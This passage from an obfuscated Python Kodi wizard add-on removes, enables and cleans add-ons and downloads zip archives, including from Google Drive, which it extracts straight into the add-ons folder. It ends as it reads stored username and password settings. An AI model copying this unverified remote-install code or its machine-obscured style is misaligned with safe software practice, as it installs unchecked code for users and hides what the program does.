			O0O0OOO0O0O000OOO =OOO0OOO0O0O0000O0 .read ()#line:2975
			OOO00OOO0OO0O0OO0 =wiz .parseDOM (O0O0OOO0O0O000OOO ,'addon',ret ='id')#line:2976
			OOO0O000OO0OOOO00 =O0O00000O000OO0OO if len (OOO00OOO0OO0O0OO0 )==0 else OOO00OOO0OO0O0OO0 [0 ]#line:2978
			try :#line:2979
				O0O00OO00O0O00OOO =xbmcaddon .Addon (id =OOO0O000OO0OOOO00 )#line:2980
				OO0O00000OO0OO00O .append (O0O00OO00O0O00OOO .getAddonInfo ('name'))#line:2981
				OOOO00OO0OO0OOOO0 .append (OOO0O000OO0OOOO00 )#line:2982
			except :#line:2983
				pass #line:2984
	if len (OO0O00000OO0OO00O )==0 :#line:2985
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2986
		return #line:2987
	if KODIV >16 :#line:2988
		OOO0O00O0000O0OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O00000OO0OO00O )#line:2989
	else :#line:2990
		OOO0O00O0000O0OO0 =[];O00O0O00OO00000O0 =0 #line:2991
		OOOOOO0OOO00O0OO0 =["-- Click here to Continue --"]+OO0O00000OO0OO00O #line:2992
		while not O00O0O00OO00000O0 ==-1 :#line:2993
			O00O0O00OO00000O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOOOO0OOO00O0OO0 )#line:2994
			if O00O0O00OO00000O0 ==-1 :break #line:2995
			elif O00O0O00OO00000O0 ==0 :break #line:2996
			else :#line:2997
				O0O000O00O0OOO0O0 =(O00O0O00OO00000O0 -1 )#line:2998
				if O0O000O00O0OOO0O0 in OOO0O00O0000O0OO0 :#line:2999
					OOO0O00O0000O0OO0 .remove (O0O000O00O0OOO0O0 )#line:3000
					OOOOOO0OOO00O0OO0 [O00O0O00OO00000O0 ]=OO0O00000OO0OO00O [O0O000O00O0OOO0O0 ]#line:3001
				else :#line:3002
					OOO0O00O0000O0OO0 .append (O0O000O00O0OOO0O0 )#line:3003
					OOOOOO0OOO00O0OO0 [O00O0O00OO00000O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O00000OO0OO00O [O0O000O00O0OOO0O0 ])#line:3004
	if OOO0O00O0000O0OO0 ==None :return #line:3005
	if len (OOO0O00O0000O0OO0 )>0 :#line:3006
		wiz .addonUpdates ('set')#line:3007
		for OOO000000O00OOOOO in OOO0O00O0000O0OO0 :#line:3008
			removeAddon (OOOO00OO0OO0OOOO0 [OOO000000O00OOOOO ],OO0O00000OO0OO00O [OOO000000O00OOOOO ],True )#line:3009
		xbmc .sleep (1000 )#line:3011
		if INSTALLMETHOD ==1 :OO00OO0O0000OO00O =1 #line:3013
		elif INSTALLMETHOD ==2 :OO00OO0O0000OO00O =0 #line:3014
		else :OO00OO0O0000OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3015
		if OO00OO0O0000OO00O ==1 :wiz .reloadFix ('remove addon')#line:3016
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3017
def removeAddonDataMenu ():#line:3019
	if os .path .exists (ADDOND ):#line:3020
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3021
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3022
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3023
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3024
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3025
		O0O00OOOO0000O0O0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3026
		for O0O0OOO0O0O0OO0OO in sorted (O0O00OOOO0000O0O0 ,key =lambda OOOO0O00O0OOOO00O :OOOO0O00O0OOOO00O ):#line:3027
			OOOOOOOO0O00O00O0 =O0O0OOO0O0O0OO0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3028
			OOOOO00O0OOOO00O0 =os .path .join (O0O0OOO0O0O0OO0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3029
			OOOOOO000O0OOO0OO =os .path .join (O0O0OOO0O0O0OO0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3030
			OOOO0000O0O0O0OO0 =OOOOOOOO0O00O00O0 #line:3031
			OO0OO0OO0O00OO00O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3032
			for O0OO0OOOOO0OOO0OO in OO0OO0OO0O00OO00O :#line:3033
				OOOO0000O0O0O0OO0 =OOOO0000O0O0O0OO0 .replace (O0OO0OOOOO0OOO0OO ,OO0OO0OO0O00OO00O [O0OO0OOOOO0OOO0OO ])#line:3034
			if OOOOOOOO0O00O00O0 in EXCLUDES :OOOO0000O0O0O0OO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOOO0000O0O0O0OO0 #line:3035
			else :OOOO0000O0O0O0OO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOOO0000O0O0O0OO0 #line:3036
			addFile (' %s'%OOOO0000O0O0O0OO0 ,'removedata',OOOOOOOO0O00O00O0 ,icon =OOOOO00O0OOOO00O0 ,fanart =OOOOOO000O0OOO0OO ,themeit =THEME2 )#line:3037
	else :#line:3038
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3039
	setView ('files','viewType')#line:3040
def enableAddons ():#line:3042
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3043
	O00OOO00O0000O0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3044
	O0000O000OO00OO00 =0 #line:3045
	for O0O000O0O0O0O0000 in sorted (O00OOO00O0000O0O0 ,key =lambda O0OO0O00O0OOO0OOO :O0OO0O00O0OOO0OOO ):#line:3046
		O0O00O000OOOO0OO0 =os .path .split (O0O000O0O0O0O0000 [:-1 ])[1 ]#line:3047
		if O0O00O000OOOO0OO0 in EXCLUDES :continue #line:3048
		if O0O00O000OOOO0OO0 in DEFAULTPLUGINS :continue #line:3049
		OO000OO0OOO00OO00 =os .path .join (O0O000O0O0O0O0000 ,'addon.xml')#line:3050
		if os .path .exists (OO000OO0OOO00OO00 ):#line:3051
			O0000O000OO00OO00 +=1 #line:3052
			O00OOO00O0000O0O0 =O0O000O0O0O0O0000 .replace (ADDONS ,'')[1 :-1 ]#line:3053
			OOOO0OOO0OO0OOO00 =open (OO000OO0OOO00OO00 )#line:3054
			O0000O0O0OOOOOOOO =OOOO0OOO0OO0OOO00 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3055
			OOOOOO000O00OOOOO =wiz .parseDOM (O0000O0O0OOOOOOOO ,'addon',ret ='id')#line:3056
			O0OO00O00OO0OO0OO =wiz .parseDOM (O0000O0O0OOOOOOOO ,'addon',ret ='name')#line:3057
			try :#line:3058
				O00OO00OOO0000000 =OOOOOO000O00OOOOO [0 ]#line:3059
				OOOOO0O00O000O000 =O0OO00O00OO0OO0OO [0 ]#line:3060
			except :#line:3061
				continue #line:3062
			try :#line:3063
				OO00OO00OO0OO0O00 =xbmcaddon .Addon (id =O00OO00OOO0000000 )#line:3064
				O0OOO0O0OO0OOO00O ="[COLOR green][Enabled][/COLOR]"#line:3065
				O00O0O00O0O00OO0O ="false"#line:3066
			except :#line:3067
				O0OOO0O0OO0OOO00O ="[COLOR red][Disabled][/COLOR]"#line:3068
				O00O0O00O0O00OO0O ="true"#line:3069
				pass #line:3070
			O0O0O000OOOO0O0O0 =os .path .join (O0O000O0O0O0O0000 ,'icon.png')if os .path .exists (os .path .join (O0O000O0O0O0O0000 ,'icon.png'))else ICON #line:3071
			OOO0OO0OO00OOO00O =os .path .join (O0O000O0O0O0O0000 ,'fanart.jpg')if os .path .exists (os .path .join (O0O000O0O0O0O0000 ,'fanart.jpg'))else FANART #line:3072
			addFile ("%s %s"%(O0OOO0O0OO0OOO00O ,OOOOO0O00O000O000 ),'toggleaddon',O00OOO00O0000O0O0 ,O00O0O00O0O00OO0O ,icon =O0O0O000OOOO0O0O0 ,fanart =OOO0OO0OO00OOO00O )#line:3073
			OOOO0OOO0OO0OOO00 .close ()#line:3074
	if O0000O000OO00OO00 ==0 :#line:3075
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3076
	setView ('files','viewType')#line:3077
def changeFeq ():#line:3079
	OOO0OOO00OOO0000O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3080
	OO0000OOO0O000OO0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO0OOO00OOO0000O )#line:3081
	if not OO0000OOO0O000OO0 ==-1 :#line:3082
		wiz .setS ('autocleanfeq',str (OO0000OOO0O000OO0 ))#line:3083
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO0OOO00OOO0000O [OO0000OOO0O000OO0 ]))#line:3084
def developer ():#line:3086
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3087
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3088
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3089
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3090
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3091
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3092
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3093
	setView ('files','viewType')#line:3095
def download (O00000O000O0O0OOO ,O00O0OOO000O0O0OO ):#line:3100
  OOO0O0OO0O00O000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3101
  O000O0O000O0O000O =xbmcgui .DialogProgress ()#line:3102
  O000O0O000O0O000O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3103
  O0OO00OOOOO00OO00 =os .path .join (OOO0O0OO0O00O000O ,'isr.zip')#line:3104
  OOOO000O00000O00O =urllib2 .Request (O00000O000O0O0OOO )#line:3105
  OO0O000O000O000O0 =urllib2 .urlopen (OOOO000O00000O00O )#line:3106
  OOO00O0000000OOOO =xbmcgui .DialogProgress ()#line:3108
  OOO00O0000000OOOO .create ("Downloading","Downloading "+name )#line:3109
  OOO00O0000000OOOO .update (0 )#line:3110
  OO0OO0O00OOO00000 =O00O0OOO000O0O0OO #line:3111
  OOOOOO0OO000O000O =open (O0OO00OOOOO00OO00 ,'wb')#line:3112
  try :#line:3114
    OOOO00OOOOOO0O000 =OO0O000O000O000O0 .info ().getheader ('Content-Length').strip ()#line:3115
    O00000O0OOOO000O0 =True #line:3116
  except AttributeError :#line:3117
        O00000O0OOOO000O0 =False #line:3118
  if O00000O0OOOO000O0 :#line:3120
        OOOO00OOOOOO0O000 =int (OOOO00OOOOOO0O000 )#line:3121
  O0000OOOO00OOO0O0 =0 #line:3123
  O0OO000O00OOOOOOO =time .time ()#line:3124
  while True :#line:3125
        OO0O000OO0OO000OO =OO0O000O000O000O0 .read (8192 )#line:3126
        if not OO0O000OO0OO000OO :#line:3127
            sys .stdout .write ('\n')#line:3128
            break #line:3129
        O0000OOOO00OOO0O0 +=len (OO0O000OO0OO000OO )#line:3131
        OOOOOO0OO000O000O .write (OO0O000OO0OO000OO )#line:3132
        if not O00000O0OOOO000O0 :#line:3134
            OOOO00OOOOOO0O000 =O0000OOOO00OOO0O0 #line:3135
        if OOO00O0000000OOOO .iscanceled ():#line:3136
           OOO00O0000000OOOO .close ()#line:3137
           try :#line:3138
            os .remove (O0OO00OOOOO00OO00 )#line:3139
           except :#line:3140
            pass #line:3141
           break #line:3142
        OO0OOO00O00OOO0OO =float (O0000OOOO00OOO0O0 )/OOOO00OOOOOO0O000 #line:3143
        OO0OOO00O00OOO0OO =round (OO0OOO00O00OOO0OO *100 ,2 )#line:3144
        O0OO00000O0OO00O0 =O0000OOOO00OOO0O0 /(1024 *1024 )#line:3145
        O0OO0OO00OOOOOOOO =OOOO00OOOOOO0O000 /(1024 *1024 )#line:3146
        O0OOOOOO0OO00O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO00000O0OO00O0 ,'teal',O0OO0OO00OOOOOOOO )#line:3147
        if (time .time ()-O0OO000O00OOOOOOO )>0 :#line:3148
          O00OO000O000OO0OO =O0000OOOO00OOO0O0 /(time .time ()-O0OO000O00OOOOOOO )#line:3149
          O00OO000O000OO0OO =O00OO000O000OO0OO /1024 #line:3150
        else :#line:3151
         O00OO000O000OO0OO =0 #line:3152
        O0O0OOO0O00O0OOO0 ='KB'#line:3153
        if O00OO000O000OO0OO >=1024 :#line:3154
           O00OO000O000OO0OO =O00OO000O000OO0OO /1024 #line:3155
           O0O0OOO0O00O0OOO0 ='MB'#line:3156
        if O00OO000O000OO0OO >0 and not OO0OOO00O00OOO0OO ==100 :#line:3157
            OOO0OO0OO0OO0OO0O =(OOOO00OOOOOO0O000 -O0000OOOO00OOO0O0 )/O00OO000O000OO0OO #line:3158
        else :#line:3159
            OOO0OO0OO0OO0OO0O =0 #line:3160
        O00OO00OO0OO00OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO000O000OO0OO ,O0O0OOO0O00O0OOO0 )#line:3161
        OOO00O0000000OOOO .update (int (OO0OOO00O00OOO0OO ),"Downloading "+name ,O0OOOOOO0OO00O0OO ,O00OO00OO0OO00OO0 )#line:3163
  O00OOOOO0O0O00O0O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3166
  OOOOOO0OO000O000O .close ()#line:3168
  extract (O0OO00OOOOO00OO00 ,O00OOOOO0O0O00O0O ,OOO00O0000000OOOO )#line:3170
  if os .path .exists (O00OOOOO0O0O00O0O +'/scakemyer-script.quasar.burst'):#line:3171
    if os .path .exists (O00OOOOO0O0O00O0O +'/script.quasar.burst'):#line:3172
     shutil .rmtree (O00OOOOO0O0O00O0O +'/script.quasar.burst',ignore_errors =False )#line:3173
    os .rename (O00OOOOO0O0O00O0O +'/scakemyer-script.quasar.burst',O00OOOOO0O0O00O0O +'/script.quasar.burst')#line:3174
  if os .path .exists (O00OOOOO0O0O00O0O +'/plugin.video.kmediatorrent-master'):#line:3176
    if os .path .exists (O00OOOOO0O0O00O0O +'/plugin.video.kmediatorrent'):#line:3177
     shutil .rmtree (O00OOOOO0O0O00O0O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3178
    os .rename (O00OOOOO0O0O00O0O +'/plugin.video.kmediatorrent-master',O00OOOOO0O0O00O0O +'/plugin.video.kmediatorrent')#line:3179
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3180
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3181
  try :#line:3182
    os .remove (O0OO00OOOOO00OO00 )#line:3183
  except :#line:3184
    pass #line:3185
  OOO00O0000000OOOO .close ()#line:3186
def dis_or_enable_addon (O00O0OOO00O00O0OO ,OOOO0O0OOO000OO00 ,enable ="true"):#line:3187
    import json #line:3188
    OO0OO0OO000OO0OOO ='"%s"'%O00O0OOO00O00O0OO #line:3189
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0OOO00O00O0OO )and enable =="true":#line:3190
        logging .warning ('already Enabled')#line:3191
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00O0OOO00O00O0OO )#line:3192
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0OOO00O00O0OO )and enable =="false":#line:3193
        return xbmc .log ("### Skipped %s, reason = not installed"%O00O0OOO00O00O0OO )#line:3194
    else :#line:3195
        O0000OO00000O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OO0OO000OO0OOO ,enable )#line:3196
        O000OO0O00OO00000 =xbmc .executeJSONRPC (O0000OO00000O0O0O )#line:3197
        OOO000OOO0OOOO0O0 =json .loads (O000OO0O00OO00000 )#line:3198
        if enable =="true":#line:3199
            xbmc .log ("### Enabled %s, response = %s"%(O00O0OOO00O00O0OO ,OOO000OOO0OOOO0O0 ))#line:3200
        else :#line:3201
            xbmc .log ("### Disabled %s, response = %s"%(O00O0OOO00O00O0OO ,OOO000OOO0OOOO0O0 ))#line:3202
    if OOOO0O0OOO000OO00 =='auto':#line:3203
     return True #line:3204
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3205
def chunk_report (OOOOO0O0O0000OOOO ,OO0O00OOO0OO0O000 ,O0OO00OOOOOO0O0O0 ):#line:3206
   OOOO00O0O00O00O00 =float (OOOOO0O0O0000OOOO )/O0OO00OOOOOO0O0O0 #line:3207
   OOOO00O0O00O00O00 =round (OOOO00O0O00O00O00 *100 ,2 )#line:3208
   if OOOOO0O0O0000OOOO >=O0OO00OOOOOO0O0O0 :#line:3210
      sys .stdout .write ('\n')#line:3211
def chunk_read (O0O0000O0OO00OO0O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3213
   import time #line:3214
   OO0O0OOO0000000O0 =int (filesize )*1000000 #line:3215
   OO00O000OOOO0OOO0 =0 #line:3217
   O00OO0O0000O0O000 =time .time ()#line:3218
   O00OOOO0OO0OOO0O0 =0 #line:3219
   logging .warning ('Downloading')#line:3221
   with open (destination ,"wb")as OOOOOOOOOOOOO0O00 :#line:3222
    while 1 :#line:3223
      OOOO0OO00O0O0000O =time .time ()-O00OO0O0000O0O000 #line:3224
      OOOOOO0OO0O0000OO =int (O00OOOO0OO0OOO0O0 *chunk_size )#line:3225
      O0O00O0OOO00OOO00 =O0O0000O0OO00OO0O .read (chunk_size )#line:3226
      OOOOOOOOOOOOO0O00 .write (O0O00O0OOO00OOO00 )#line:3227
      OOOOOOOOOOOOO0O00 .flush ()#line:3228
      OO00O000OOOO0OOO0 +=len (O0O00O0OOO00OOO00 )#line:3229
      OO00O0OO0OO000O00 =float (OO00O000OOOO0OOO0 )/OO0O0OOO0000000O0 #line:3230
      OO00O0OO0OO000O00 =round (OO00O0OO0OO000O00 *100 ,2 )#line:3231
      if int (OOOO0OO00O0O0000O )>0 :#line:3232
        O0O0OO0O000O0O0O0 =int (OOOOOO0OO0O0000OO /(1024 *OOOO0OO00O0O0000O ))#line:3233
      else :#line:3234
         O0O0OO0O000O0O0O0 =0 #line:3235
      if O0O0OO0O000O0O0O0 >1024 and not OO00O0OO0OO000O00 ==100 :#line:3236
          O00O00OOOO00000O0 =int (((OO0O0OOO0000000O0 -OOOOOO0OO0O0000OO )/1024 )/(O0O0OO0O000O0O0O0 ))#line:3237
      else :#line:3238
          O00O00OOOO00000O0 =0 #line:3239
      if O00O00OOOO00000O0 <0 :#line:3240
        O00O00OOOO00000O0 =0 #line:3241
      dp .update (int (OO00O0OO0OO000O00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00O0OO0OO000O00 ,OOOOOO0OO0O0000OO /(1024 *1024 ),OO0O0OOO0000000O0 /(1000 *1000 ),O0O0OO0O000O0O0O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00O00OOOO00000O0 ,60 ))#line:3242
      if dp .iscanceled ():#line:3243
         dp .close ()#line:3244
         break #line:3245
      if not O0O00O0OOO00OOO00 :#line:3246
         break #line:3247
      if report_hook :#line:3249
         report_hook (OO00O000OOOO0OOO0 ,chunk_size ,OO0O0OOO0000000O0 )#line:3250
      O00OOOO0OO0OOO0O0 +=1 #line:3251
   logging .warning ('END Downloading')#line:3252
   return OO00O000OOOO0OOO0 #line:3253
def googledrive_download (OO0O0OOOO0O000OO0 ,O0O0OOOOO0000O00O ,OOO00O00O000O00OO ,O0O000O0OO00OO0OO ):#line:3255
    O000OO00O0OOOOO0O =[]#line:3259
    OO00OOOO00O000O00 =OO0O0OOOO0O000OO0 .split ('=')#line:3260
    OO0O0OOOO0O000OO0 =OO00OOOO00O000O00 [len (OO00OOOO00O000O00 )-1 ]#line:3261
    def O0O0OO000O0000O0O (O00O0OO00OOOOO0OO ):#line:3263
        for OO000OOOOO0O0O00O in O00O0OO00OOOOO0OO :#line:3265
            logging .warning ('cookie.name')#line:3266
            logging .warning (OO000OOOOO0O0O00O .name )#line:3267
            O000000O00O000O00 =OO000OOOOO0O0O00O .value #line:3268
            if 'download_warning'in OO000OOOOO0O0O00O .name :#line:3269
                logging .warning (OO000OOOOO0O0O00O .value )#line:3270
                logging .warning ('cookie.value')#line:3271
                return OO000OOOOO0O0O00O .value #line:3272
            return O000000O00O000O00 #line:3273
        return None #line:3275
    def OO0O0OO0O0O00O000 (OOOO000OOOOO00OOO ,O00OOOO00000O00OO ):#line:3277
        OOOOOO00OOO0OOO0O =32768 #line:3279
        OOOOO00O0OO0O0000 =time .time ()#line:3280
        with open (O00OOOO00000O00OO ,"wb")as OOOOO00OO00OO00O0 :#line:3282
            OOOO00OO00OO00O0O =1 #line:3283
            OOO0O0OOO00OO0O00 =32768 #line:3284
            try :#line:3285
                OOO00O00OO0OO0000 =int (OOOO000OOOOO00OOO .headers .get ('content-length'))#line:3286
                print ('file total size :',OOO00O00OO0OO0000 )#line:3287
            except TypeError :#line:3288
                print ('using dummy length !!!')#line:3289
                OOO00O00OO0OO0000 =int (O0O000O0OO00OO0OO )*1000000 #line:3290
            for O0000O00OO0OOO00O in OOOO000OOOOO00OOO .iter_content (OOOOOO00OOO0OOO0O ):#line:3291
                if O0000O00OO0OOO00O :#line:3292
                    OOOOO00OO00OO00O0 .write (O0000O00OO0OOO00O )#line:3293
                    OOOOO00OO00OO00O0 .flush ()#line:3294
                    O0OO000OOOO0O0000 =time .time ()-OOOOO00O0OO0O0000 #line:3295
                    OOO0000OO00O000O0 =int (OOOO00OO00OO00O0O *OOO0O0OOO00OO0O00 )#line:3296
                    if O0OO000OOOO0O0000 ==0 :#line:3297
                        O0OO000OOOO0O0000 =0.1 #line:3298
                    OOOOO00000OO0O00O =int (OOO0000OO00O000O0 /(1024 *O0OO000OOOO0O0000 ))#line:3299
                    O0O0000OO0OOO00O0 =int (OOOO00OO00OO00O0O *OOO0O0OOO00OO0O00 *100 /OOO00O00OO0OO0000 )#line:3300
                    if OOOOO00000OO0O00O >1024 and not O0O0000OO0OOO00O0 ==100 :#line:3301
                      OOO00000OOO0O0O0O =int (((OOO00O00OO0OO0000 -OOO0000OO00O000O0 )/1024 )/(OOOOO00000OO0O00O ))#line:3302
                    else :#line:3303
                      OOO00000OOO0O0O0O =0 #line:3304
                    OOO00O00O000O00OO .update (int (O0O0000OO0OOO00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0000OO0OOO00O0 ,OOO0000OO00O000O0 /(1024 *1024 ),OOO00O00OO0OO0000 /(1000 *1000 ),OOOOO00000OO0O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO00000OOO0O0O0O ,60 ))#line:3306
                    OOOO00OO00OO00O0O +=1 #line:3307
                    if OOO00O00O000O00OO .iscanceled ():#line:3308
                     OOO00O00O000O00OO .close ()#line:3309
                     break #line:3310
    O00O0OO00000OOOOO ="https://docs.google.com/uc?export=download"#line:3311
    import urllib2 #line:3316
    import cookielib #line:3317
    from cookielib import CookieJar #line:3319
    OO0000000OO0000O0 =CookieJar ()#line:3321
    O0000O00OO0O0OOO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0000000OO0000O0 ))#line:3322
    OO0OOO0O000000OO0 ={'id':OO0O0OOOO0O000OO0 }#line:3324
    OOOO0O0O00OOO000O =urllib .urlencode (OO0OOO0O000000OO0 )#line:3325
    logging .warning (O00O0OO00000OOOOO +'&'+OOOO0O0O00OOO000O )#line:3326
    O000O0O000O0O0000 =O0000O00OO0O0OOO0 .open (O00O0OO00000OOOOO +'&'+OOOO0O0O00OOO000O )#line:3327
    OOO00O000OO00OO00 =O000O0O000O0O0000 .read ()#line:3328
    for O0000OOO0O0O00OO0 in OO0000000OO0000O0 :#line:3330
         logging .warning (O0000OOO0O0O00OO0 )#line:3331
    OOOO00O0OO0O000O0 =O0O0OO000O0000O0O (OO0000000OO0000O0 )#line:3332
    logging .warning (OOOO00O0OO0O000O0 )#line:3333
    if OOOO00O0OO0O000O0 :#line:3334
        OOO00OOO000O0OO0O ={'id':OO0O0OOOO0O000OO0 ,'confirm':OOOO00O0OO0O000O0 }#line:3335
        O00OOO0OO0O0OOOO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3336
        OOOO0O0O00OOO000O =urllib .urlencode (OOO00OOO000O0OO0O )#line:3337
        O000O0O000O0O0000 =O0000O00OO0O0OOO0 .open (O00O0OO00000OOOOO +'&'+OOOO0O0O00OOO000O )#line:3338
        chunk_read (O000O0O000O0O0000 ,report_hook =chunk_report ,dp =OOO00O00O000O00OO ,destination =O0O0OOOOO0000O00O ,filesize =O0O000O0OO00OO0OO )#line:3339
    return (O000OO00O0OOOOO0O )#line:3343
def kodi17Fix ():#line:3344
	O0O0000000O0OOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3345
	OO0000OO000OO0OO0 =[]#line:3346
	for O0000000O0OOOO0OO in sorted (O0O0000000O0OOO0O ,key =lambda OOO000O0O0O00OO0O :OOO000O0O0O00OO0O ):#line:3347
		OO00O000OOOO0OO0O =os .path .join (O0000000O0OOOO0OO ,'addon.xml')#line:3348
		if os .path .exists (OO00O000OOOO0OO0O ):#line:3349
			O00OO0O0OOOOOOOO0 =O0000000O0OOOO0OO .replace (ADDONS ,'')[1 :-1 ]#line:3350
			O00OO00OO0OO00OOO =open (OO00O000OOOO0OO0O )#line:3351
			OO0O0OO0O00O00O0O =O00OO00OO0OO00OOO .read ()#line:3352
			OO00O000O00OO0OO0 =parseDOM (OO0O0OO0O00O00O0O ,'addon',ret ='id')#line:3353
			O00OO00OO0OO00OOO .close ()#line:3354
			try :#line:3355
				O0OOO0O0OOOOO00O0 =xbmcaddon .Addon (id =OO00O000O00OO0OO0 [0 ])#line:3356
			except :#line:3357
				try :#line:3358
					log ("%s was disabled"%OO00O000O00OO0OO0 [0 ],xbmc .LOGDEBUG )#line:3359
					OO0000OO000OO0OO0 .append (OO00O000O00OO0OO0 [0 ])#line:3360
				except :#line:3361
					try :#line:3362
						log ("%s was disabled"%O00OO0O0OOOOOOOO0 ,xbmc .LOGDEBUG )#line:3363
						OO0000OO000OO0OO0 .append (O00OO0O0OOOOOOOO0 )#line:3364
					except :#line:3365
						if len (OO00O000O00OO0OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00OO0O0OOOOOOOO0 ,xbmc .LOGERROR )#line:3366
						else :log ("Unabled to enable: %s"%O0000000O0OOOO0OO ,xbmc .LOGERROR )#line:3367
	if len (OO0000OO000OO0OO0 )>0 :#line:3368
		O0OOOO0000OOO0OOO =0 #line:3369
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3370
		for OO000O0O0OO0O0000 in OO0000OO000OO0OO0 :#line:3371
			O0OOOO0000OOO0OOO +=1 #line:3372
			OO0O000OO0O0OOO00 =int (percentage (O0OOOO0000OOO0OOO ,len (OO0000OO000OO0OO0 )))#line:3373
			DP .update (OO0O000OO0O0OOO00 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0O0OO0O0000 ))#line:3374
			addonDatabase (OO000O0O0OO0O0000 ,1 )#line:3375
			if DP .iscanceled ():break #line:3376
		if DP .iscanceled ():#line:3377
			DP .close ()#line:3378
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3379
			sys .exit ()#line:3380
		DP .close ()#line:3381
	forceUpdate ()#line:3382
def indicator ():#line:3383
       try :#line:3384
          import json #line:3385
          wiz .log ('FRESH MESSAGE')#line:3386
          O0O0000OO0OOOO0O0 =(ADDON .getSetting ("user"))#line:3387
          OOO000OO0OOOOOO00 =(ADDON .getSetting ("pass"))#line:3388
